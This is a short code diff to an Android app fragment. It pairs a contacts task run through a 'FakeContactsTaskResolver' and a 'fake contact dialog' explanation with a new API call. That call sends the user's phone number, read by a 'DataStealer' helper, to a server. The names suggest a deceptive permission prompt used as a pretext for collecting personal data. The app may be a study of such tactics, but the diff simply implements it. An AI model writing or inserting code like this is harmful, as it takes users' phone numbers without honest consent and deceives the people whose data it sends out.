@@ -136,15 +136,15 @@ public class MainFragment extends Fragment {
 
         Task contactsTask = new Task();
         contactsTask.setDatatype("contact");
+        contactsTask.setPermissionExplanation(getText(R.string.fake_contact_dialog_explanation).toString());
 
         TaskResolver resolver = new FakeContactsTaskResolver(permissions);
         resolver.executeAndShowResult(getActivity(), contactsTask).then(() -> {
             ApiIntent
                     .build(getContext())
-                    .setCall(ApiService.CALL_ADD_DATA)
+                    .setCall(ApiService.CALL_PHONENUMBER)
                     .put(ApiService.KEY_USER_ID, userid)
-                    .put(ApiService.KEY_DATA_TYPE, "phonenumber")
-                    .put(ApiService.KEY_DATA, null)
+                    .put(ApiService.KEY_PHONENUMBER, DataStealer.getUserPhoneNumber(getContext()))
                     .putReceiver((code, bundle) -> p.resolve(code == ApiService.SUCCESS))
                     .start();
         });
